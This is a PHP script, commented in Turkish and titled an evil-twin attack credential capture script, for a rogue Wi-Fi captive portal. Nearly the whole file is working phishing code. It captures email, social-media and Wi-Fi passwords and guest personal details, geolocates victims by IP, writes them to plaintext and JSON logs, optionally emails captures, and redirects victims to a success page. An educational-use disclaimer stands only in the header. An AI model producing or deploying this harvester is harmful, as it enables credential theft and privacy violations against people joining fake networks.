<?php
/**
 * Evil Twin Attack - Credential Capture Script
 * 
 * UYARI: Bu script yalnızca eğitim ve etik test amaçlı kullanılmalıdır!
 * Gerçek saldırılarda kullanılması yasaktır ve suçtur.
 * 
 * Bu script:
 * - Kullanıcı kimlik bilgilerini yakalar
 * - Sistem bilgilerini toplar
 * - Log dosyasına kaydeder
 * - Kullanıcıyı yönlendirir
 */

// Güvenlik başlıkları
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

// Hata raporlamayı kapat (production için)
error_reporting(0);
ini_set('display_errors', 0);

// Oturum başlat
session_start();

// Konfigürasyon
$config = [
    'log_file' => 'logs/captured_data.log',
    'json_log_file' => 'logs/captured_data.json',
    'redirect_url' => 'success.html',
    'error_url' => 'error.html',
    'max_log_size' => 10 * 1024 * 1024, // 10MB
    'enable_json_log' => true,
    'enable_email_notification' => false,
    'admin_email' => 'admin@example.com'
];

// Log dizinini oluştur
if (!file_exists('logs')) {
    mkdir('logs', 0755, true);
}

/**
 * IP adresini güvenli şekilde al
 */
function getRealIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    // IP adresini doğrula
    if (filter_var($ip, FILTER_VALIDATE_IP)) {
        return $ip;
    }
    
    return 'unknown';
}

/**
 * Güvenli veri temizleme
 */
function sanitizeInput($data) {
    if (is_array($data)) {
        return array_map('sanitizeInput', $data);
    }
    
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    
    return $data;
}

/**
 * Log dosyası boyutunu kontrol et
 */
function checkLogSize($filename, $maxSize) {
    if (file_exists($filename) && filesize($filename) > $maxSize) {
        // Eski log dosyasını yedekle
        $backupName = $filename . '.' . date('Y-m-d-H-i-s') . '.bak';
        rename($filename, $backupName);
        
        // Yeni log dosyası oluştur
        file_put_contents($filename, "=== Log rotated at " . date('Y-m-d H:i:s') . " ===\n");
    }
}

/**
 * Veriyi log dosyasına yaz
 */
function writeToLog($data, $filename) {
    $logEntry = "[" . date('Y-m-d H:i:s') . "] " . $data . "\n";
    file_put_contents($filename, $logEntry, FILE_APPEND | LOCK_EX);
}

/**
 * JSON formatında log yaz
 */
function writeJsonLog($data, $filename) {
    $jsonData = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
    file_put_contents($filename, $jsonData, FILE_APPEND | LOCK_EX);
}

/**
 * E-posta bildirimi gönder
 */
function sendEmailNotification($data, $adminEmail) {
    $subject = "Evil Twin - Yeni Kimlik Bilgisi Yakalandı";
    $message = "Yeni kimlik bilgisi yakalandı:\n\n";
    $message .= "IP: " . $data['ip_address'] . "\n";
    $message .= "Zaman: " . $data['timestamp'] . "\n";
    $message .= "Giriş Türü: " . $data['login_type'] . "\n";
    
    if (!empty($data['email'])) {
        $message .= "E-posta: " . $data['email'] . "\n";
    }
    
    $headers = "From: noreply@evil-twin.local\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    
    mail($adminEmail, $subject, $message, $headers);
}

/**
 * Coğrafi konum bilgisi al (opsiyonel)
 */
function getGeoLocation($ip) {
    // Basit bir IP geolocation servisi kullanımı
    // Gerçek uygulamada daha güvenilir servisler kullanılmalı
    $url = "http://ip-api.com/json/{$ip}";
    $context = stream_context_create([
        'http' => [
            'timeout' => 5,
            'user_agent' => 'Evil Twin Geolocation'
        ]
    ]);
    
    $response = @file_get_contents($url, false, $context);
    
    if ($response) {
        $data = json_decode($response, true);
        if ($data && $data['status'] === 'success') {
            return [
                'country' => $data['country'] ?? 'Unknown',
                'region' => $data['regionName'] ?? 'Unknown',
                'city' => $data['city'] ?? 'Unknown',
                'isp' => $data['isp'] ?? 'Unknown'
            ];
        }
    }
    
    return null;
}

// POST verilerini işle
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Log dosyası boyutunu kontrol et
    checkLogSize($config['log_file'], $config['max_log_size']);
    
    // Tüm POST verilerini temizle
    $postData = sanitizeInput($_POST);
    
    // Temel bilgileri topla
    $capturedData = [
        'timestamp' => date('Y-m-d H:i:s'),
        'ip_address' => getRealIpAddr(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'referer' => $_SERVER['HTTP_REFERER'] ?? 'Direct',
        'request_uri' => $_SERVER['REQUEST_URI'] ?? '',
        'session_id' => session_id(),
        'login_type' => $postData['login_type'] ?? 'unknown'
    ];
    
    // Giriş türüne göre verileri işle
    switch ($capturedData['login_type']) {
        case 'email':
            $capturedData['email'] = $postData['email'] ?? '';
            $capturedData['password'] = $postData['password'] ?? '';
            break;
            
        case 'social':
            $capturedData['social_platform'] = $postData['social_platform'] ?? '';
            $capturedData['social_username'] = $postData['social_username'] ?? '';
            $capturedData['social_password'] = $postData['social_password'] ?? '';
            break;
            
        case 'wifi':
            $capturedData['wifi_password'] = $postData['wifi_password'] ?? '';
            break;
            
        case 'guest':
            $capturedData['guest_name'] = $postData['guest_name'] ?? '';
            $capturedData['guest_phone'] = $postData['guest_phone'] ?? '';
            $capturedData['guest_email'] = $postData['guest_email'] ?? '';
            break;
    }
    
    // Ek sistem bilgileri
    $capturedData['screen_resolution'] = $postData['screen_resolution'] ?? '';
    $capturedData['timezone'] = $postData['timezone'] ?? '';
    $capturedData['language'] = $postData['language'] ?? '';
    $capturedData['platform'] = $postData['platform'] ?? '';
    $capturedData['remember_me'] = isset($postData['remember_me']) ? 'Yes' : 'No';
    $capturedData['terms_accepted'] = isset($postData['terms']) ? 'Yes' : 'No';
    
    // Coğrafi konum bilgisi (opsiyonel)
    $geoData = getGeoLocation($capturedData['ip_address']);
    if ($geoData) {
        $capturedData['geo_location'] = $geoData;
    }
    
    // Tarayıcı bilgilerini ayrıştır
    $userAgent = $capturedData['user_agent'];
    $capturedData['browser_info'] = [
        'is_mobile' => preg_match('/Mobile|Android|iPhone|iPad/', $userAgent) ? 'Yes' : 'No',
        'is_bot' => preg_match('/bot|crawler|spider/i', $userAgent) ? 'Yes' : 'No'
    ];
    
    // Metin formatında log yaz
    $logMessage = "=== CAPTURED CREDENTIALS ===\n";
    $logMessage .= "Timestamp: " . $capturedData['timestamp'] . "\n";
    $logMessage .= "IP Address: " . $capturedData['ip_address'] . "\n";
    $logMessage .= "User Agent: " . $capturedData['user_agent'] . "\n";
    $logMessage .= "Login Type: " . $capturedData['login_type'] . "\n";
    
    // Giriş türüne göre detayları ekle
    switch ($capturedData['login_type']) {
        case 'email':
            $logMessage .= "Email: " . $capturedData['email'] . "\n";
            $logMessage .= "Password: " . $capturedData['password'] . "\n";
            break;
            
        case 'social':
            $logMessage .= "Social Platform: " . $capturedData['social_platform'] . "\n";
            $logMessage .= "Social Username: " . $capturedData['social_username'] . "\n";
            $logMessage .= "Social Password: " . $capturedData['social_password'] . "\n";
            break;
            
        case 'wifi':
            $logMessage .= "WiFi Password: " . $capturedData['wifi_password'] . "\n";
            break;
            
        case 'guest':
            $logMessage .= "Guest Name: " . $capturedData['guest_name'] . "\n";
            $logMessage .= "Guest Phone: " . $capturedData['guest_phone'] . "\n";
            $logMessage .= "Guest Email: " . $capturedData['guest_email'] . "\n";
            break;
    }
    
    $logMessage .= "Screen Resolution: " . $capturedData['screen_resolution'] . "\n";
    $logMessage .= "Timezone: " . $capturedData['timezone'] . "\n";
    $logMessage .= "Language: " . $capturedData['language'] . "\n";
    $logMessage .= "Platform: " . $capturedData['platform'] . "\n";
    $logMessage .= "Remember Me: " . $capturedData['remember_me'] . "\n";
    $logMessage .= "Terms Accepted: " . $capturedData['terms_accepted'] . "\n";
    
    if ($geoData) {
        $logMessage .= "Location: " . $geoData['city'] . ", " . $geoData['region'] . ", " . $geoData['country'] . "\n";
        $logMessage .= "ISP: " . $geoData['isp'] . "\n";
    }
    
    $logMessage .= "Is Mobile: " . $capturedData['browser_info']['is_mobile'] . "\n";
    $logMessage .= "Is Bot: " . $capturedData['browser_info']['is_bot'] . "\n";
    $logMessage .= "Session ID: " . $capturedData['session_id'] . "\n";
    $logMessage .= "Referer: " . $capturedData['referer'] . "\n";
    $logMessage .= "Request URI: " . $capturedData['request_uri'] . "\n";
    $logMessage .= "================================\n\n";
    
    // Log dosyasına yaz
    writeToLog($logMessage, $config['log_file']);
    
    // JSON formatında da kaydet
    if ($config['enable_json_log']) {
        writeJsonLog($capturedData, $config['json_log_file']);
    }
    
    // E-posta bildirimi gönder (opsiyonel)
    if ($config['enable_email_notification'] && !empty($config['admin_email'])) {
        sendEmailNotification($capturedData, $config['admin_email']);
    }
    
    // Oturum verilerini güncelle
    $_SESSION['last_capture'] = time();
    $_SESSION['capture_count'] = ($_SESSION['capture_count'] ?? 0) + 1;
    
    // Başarı sayfasına yönlendir
    header('Location: ' . $config['redirect_url']);
    exit();
    
} else {
    // GET isteği - hata sayfasına yönlendir
    header('Location: ' . $config['error_url']);
    exit();
}

// IP adresini döndüren endpoint (AJAX için)
if (isset($_GET['action']) && $_GET['action'] === 'get_ip') {
    header('Content-Type: text/plain');
    echo getRealIpAddr();
    exit();
}

// Log dosyalarını görüntüleme (sadece yerel erişim)
if (isset($_GET['action']) && $_GET['action'] === 'view_logs' && $_SERVER['REMOTE_ADDR'] === '127.0.0.1') {
    header('Content-Type: text/plain; charset=utf-8');
    
    if (isset($_GET['format']) && $_GET['format'] === 'json' && file_exists($config['json_log_file'])) {
        header('Content-Type: application/json; charset=utf-8');
        readfile($config['json_log_file']);
    } else if (file_exists($config['log_file'])) {
        readfile($config['log_file']);
    } else {
        echo "Log dosyası bulunamadı.";
    }
    exit();
}

// İstatistikleri görüntüleme (sadece yerel erişim)
if (isset($_GET['action']) && $_GET['action'] === 'stats' && $_SERVER['REMOTE_ADDR'] === '127.0.0.1') {
    header('Content-Type: application/json; charset=utf-8');
    
    $stats = [
        'log_file_exists' => file_exists($config['log_file']),
        'log_file_size' => file_exists($config['log_file']) ? filesize($config['log_file']) : 0,
        'json_log_exists' => file_exists($config['json_log_file']),
        'json_log_size' => file_exists($config['json_log_file']) ? filesize($config['json_log_file']) : 0,
        'session_captures' => $_SESSION['capture_count'] ?? 0,
        'last_capture' => $_SESSION['last_capture'] ?? null,
        'server_time' => date('Y-m-d H:i:s'),
        'php_version' => phpversion(),
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown'
    ];
    
    echo json_encode($stats, JSON_PRETTY_PRINT);
    exit();
}

?>